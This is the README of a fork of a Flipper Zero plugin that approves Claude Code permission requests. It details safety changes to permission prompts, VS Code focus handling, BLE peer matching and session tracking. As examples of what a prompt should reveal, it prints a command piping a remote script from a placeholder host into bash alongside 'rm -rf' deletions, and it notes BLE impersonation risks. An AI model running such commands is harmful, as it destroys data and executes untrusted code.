# Fork changes

This is a fork of [jxw1102/flipper-claude-buddy](https://github.com/jxw1102/flipper-claude-buddy)
(MIT). Upstream is excellent and unmodified in every respect not listed here. Three
things differ, all for the same reason: this Flipper drives Claude Code sessions that
have write access to a home-automation stack, so the failure modes worth guarding
against are "approved something I couldn't read" and "typed into the wrong window".

## 1. "Always allow" is disabled

Upstream maps the Flipper's **ALWAYS** button onto Claude Code's `updatedPermissions`,
which writes a *persistent* permission rule into `settings.json`. The Flipper displays
at most 21 characters of tool detail on a 128×64 screen, so a Bash approval reads as
the first 21 characters of the description. That is not enough context to grant a
standing rule.

Concretely, given a `Bash` request with `permission_suggestions`, upstream emits:

```json
{"decision": {"behavior": "allow",
              "updatedPermissions": [{"behavior": "allow", "rules": [{"toolName": "Bash"}]}]}}
```

— a blanket allow-all-Bash rule. This fork emits:

```json
{"decision": {"behavior": "allow"}}
```

ALWAYS now behaves exactly like a one-time ALLOW. Deny and one-time allow are unchanged.

Enforced in three places so no single component can reintroduce it:

| File | Change |
|---|---|
| `plugin/scripts/on-permission-request.py` | Never emits `updatedPermissions` |
| `plugin/host-bridge/bridge/daemon.py` | Forces `always=False` on every `perm_resp` |
| `flipper-app/claude_buddy.c` | Hides the ALWAYS toggle in the on-device UI |

The firmware change only takes effect if you rebuild the `.fap` (see below). With the
stock prebuilt `.fap`, the ALWAYS option still appears on the Flipper — pressing it is
simply equivalent to a one-time allow, because the host side ignores it.

### Permission prompts show three times more context

Removing the Once/Always toggle freed the screen row it occupied, taking the
detail text from two wrapped lines to three (`ui.c:1310`). That row was going
to waste, because the *host* truncated the detail to 21 characters — one line —
before it ever reached the device, even though `PermModel.detail` is
`char[64]` and the wire format allows 64-byte fields. The cap is now 63 bytes:

```
upstream:  Check whether a permi
fork:      rm -rf /tmp/build && curl https://sh.example.com | bash
```

Two related changes:

- **Details are ASCII-fitted and capped by bytes** (`_fit()` in the hook). The
  device draws single-byte glyphs into a fixed buffer, so upstream sending e.g.
  `héllo — wörld` would render as garbage and risk a cut mid-sequence.
- **Bash prompts are configurable** via the `permissionDetail` option
  (`description` — default, `command`, or `both`).

This needs no firmware change — the device could always display it.

#### Why `description` is the default

Showing the raw command looks like the safer choice — a description is prose
written alongside the call and can describe something other than what runs.
In practice it is worse, because agent-issued commands are front-loaded with
boilerplate, and the boilerplate is exactly what survives truncation:

```
command: cd "/Users/tonyjoy/Documents/Claude Projects/flipper-…" && gh workflow run …

   |cd "/Users/tonyjoy/D|      description would be:
   |ocuments/Claude     |      "Rebuild the FAP"
   |Projects/flipper-   |
```

Both non-default modes strip leading `cd …&&` and `VAR=value` prefixes first,
so `command` mode shows `gh workflow run "Build Flipper App" --ref main`
rather than a path.

`both` is worth considering as a default if you want the safety property back
without losing readability — the description comes first so it always survives
truncation, and the command fills whatever space remains:

```
Clean up temp files: rm -rf /important/data
```

which is precisely the case a friendly description would otherwise hide.

## 2. VS Code extension support

Upstream targets a terminal. It finds the window to type into via `TERM_PROGRAM`,
`TERM_SESSION_ID` and the controlling tty. When Claude Code runs as the **VS Code
extension** (side bar or tab) none of those exist:

```
TERM_PROGRAM=unset   TERM=unset   tty: not a tty
parent chain: zsh -> .../native-binary/claude -> Code Helper (Plugin) -> Code
```

`session-target.py` therefore registered nothing, the input backend's target stayed
`None`, and keystrokes went to **whatever application happened to be frontmost** with no
focusing at all. This fork:

- **Detects the extension host** by walking the parent process chain for a VS Code
  Electron process (`session-target.py: detect_vscode_extension_host()`), gated on
  `TERM_PROGRAM` being empty *and* there being no tty — so VS Code's integrated
  terminal keeps using the existing, better-targeted terminal path.
- **Focuses the Claude input before typing.** The extension ships a
  `claude-vscode.focus` command ("Claude Code: Focus input") which is idempotent. The
  bridge activates VS Code and presses a hotkey bound to it, so the caret is in a known
  place rather than in one of your source files.
- **Maps the interrupt button to Escape instead of Ctrl+C.** In a webview there is no
  SIGINT to send and `Ctrl+C` is inert (macOS copy is Cmd+C); Escape is what interrupts
  a running turn in the extension UI.

### Required one-time setup

The default focus hotkey is `cmd+ctrl+alt+j`. It is **not** the extension's built-in
`cmd+escape`, deliberately: VS Code binds that key to `claude-vscode.focus` when
`editorTextFocus` and to `claude-vscode.blur` otherwise, so pressing it blind would
dismiss the input about half the time. Bind a dedicated key instead.

`Cmd+Shift+P` → *Preferences: Open Keyboard Shortcuts (JSON)* → add:

```json
{
  "key": "cmd+ctrl+alt+j",
  "command": "claude-vscode.focus"
}
```

To use a different key, set the `vscodeFocusHotkey` plugin option (or
`FLIPPER_VSCODE_FOCUS_HOTKEY`) to match. Single characters and `F1`–`F20` are
supported; `F19` is a good choice if you have it, since nothing else claims it.

### Dictation focuses first

Upstream's voice handler calls the dictation backend directly, without the focus
step every other input path performs. macOS dictation inserts at the caret, so
the transcript landed wherever focus already was — you had to click the Claude
input by hand before pressing UP. The bridge now focuses the target first
(`InputBackend.focus()`, called before `dictation.start()`), so UP works without
touching the mouse. This is not a macOS limitation; it was a missing step.

### What works where

| Feature | Terminal | VS Code extension |
|---|---|---|
| Sounds, vibration, status display | ✅ | ✅ |
| Permission Allow / Deny | ✅ | ✅ (hook-based, no keystrokes involved) |
| Enter, "yes", Backspace, slash-command menu | ✅ | ✅ with the focus hotkey bound |
| Interrupt | Ctrl+C | Escape |
| Voice dictation | ✅ | ✅ |
| Ctrl+O, Ctrl+E, Shift+Tab, Down | ✅ | ⚠️ TUI-specific, no effect in the webview |

The feedback and Allow/Deny half runs through Claude Code hooks over a local unix
socket and never touches the UI, so it works identically in both — including when the
screen is locked. Only the typing half depends on focus.

## 3. Stricter BLE peer matching

The BLE link carries keystrokes and permission decisions. Upstream connects to the
first device advertising the Flipper service UUID (`0x3082`) *or* whose name merely
starts with `"Flipper"` — no bonding, no address check — so anything in radio range
mimicking the two GATT characteristics can impersonate the Flipper and type into your
terminal. Two settings narrow that:

| Setting | Env var | Effect |
|---|---|---|
| `bluetoothName` | `FLIPPER_BT_NAME` | When set, the name must match **exactly**; a UUID-only match is no longer accepted |
| `bluetoothAddress` | `FLIPPER_BT_ADDRESS` | Connect only to this exact BLE address, ignoring name and UUID |

Set `FLIPPER_BT_STRICT_NAME=0` to restore upstream prefix matching. With no name
configured, behaviour is byte-for-byte upstream's, so nothing breaks for anyone who
never set one.

Find your address in `/tmp/claude-flipper-bridge.log`:

```
BT: found Flipper Abcdef (AA:BB:CC:DD:EE:FF)
```

Note that the bridge caches the Flipper's name to the plugin config after the first USB
connection, which then activates exact-name matching automatically. If you later rename
the Flipper, update `bluetoothName` or delete the cache or it will stop connecting.

**This is not authentication.** BLE names and addresses are both forgeable, and there
is still no bonding requirement on the link. It raises the cost of an attack from
drive-by to targeted; it does not eliminate it. USB remains the transport with no
remote attack surface.

## 4. Restart race: the bridge no longer kills itself

Upstream tracks live sessions with a single integer in
`/tmp/claude-flipper-bridge.refcount` — incremented by `SessionStart`,
decremented by `SessionEnd`, bridge stopped when it hits zero. That is
order-dependent, and the order is not guaranteed. Observed in practice:

```
10:46:15  Bridge daemon started        (new session's SessionStart)
10:46:16  Released input target
10:46:16  Bridge stopped.              (old session's SessionEnd, 1.4s later)
```

The old session's exit hook decremented the count to zero and killed the bridge
that had just started. It is worse than a pure ordering race: a session that was
already running when the plugin was installed never ran `SessionStart` at all,
so it never incremented — but it still runs `SessionEnd` on exit and
decrements. The count then goes negative-in-effect and the bridge dies.

This fork replaces the counter with one marker file per session under
`/tmp/claude-flipper-bridge.sessions/`, named after the hook payload's
`session_id` (sanitised to `[A-Za-z0-9_.-]`, falling back to `legacy` when the
payload has no id, so both hooks still agree). `SessionEnd` removes only its own
marker and stops the bridge when the directory is empty. Ordering stops
mattering, because the new session's marker already exists by the time the old
one is removed.

Side benefits: a duplicate `SessionEnd` for the same session is now idempotent
rather than fatal, and markers older than 24h are pruned at `SessionStart` so a
crashed session cannot pin the bridge alive forever.

## Rebuilding the .fap (optional)

Only needed to hide the ALWAYS toggle on the device itself. The repo's GitHub Actions
workflow builds it:

- **Actions → Build Flipper App → Run workflow** — download `claude_buddy.fap` from the
  run artifacts, or
- push a tag (`git tag v0.6.1 && git push origin v0.6.1`) to get a release with the
  `.fap` attached.

Then copy it to the Flipper's `apps/USB/` directory, replacing the existing one.

## Staying current with upstream

```bash
git fetch upstream
git merge upstream/main
```

Conflicts, if any, will be in the files listed above. `.claude-plugin/marketplace.json`
must keep pointing at this fork — if it reverts to the upstream URL, installing from
this marketplace silently installs upstream's plugin instead.
